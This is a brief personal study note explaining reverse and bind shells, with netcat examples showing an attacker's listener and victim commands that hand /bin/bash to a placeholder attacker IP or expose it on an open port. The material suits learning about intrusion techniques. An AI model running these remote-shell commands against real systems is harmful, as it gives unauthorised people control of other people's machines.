---
category: knowledge
tags:
  - vuln/shell
  - reference
platform: n/a
status: done
created: 2026-06-17
aliases: []
---

# [[vuln--reverse-shell-bind-shell]]
It is simply victim connecting to the attacker's machine.
The attacker listens in a certain port in which the victim connects.
Eg:
Attacker: nc -lvnp 4444
Victim: nc {attacker_ip} 4444 -e /bin/bash
# Bind Shell
Just like when we connect to a server, a bind shell is when the attackers somehow opens up a port in victim machine and then gains access to their machine.
Eg:
Attacker: nc {victim_ip}  4444
Victim: nc -lvnp 4444 -e /bin/bash
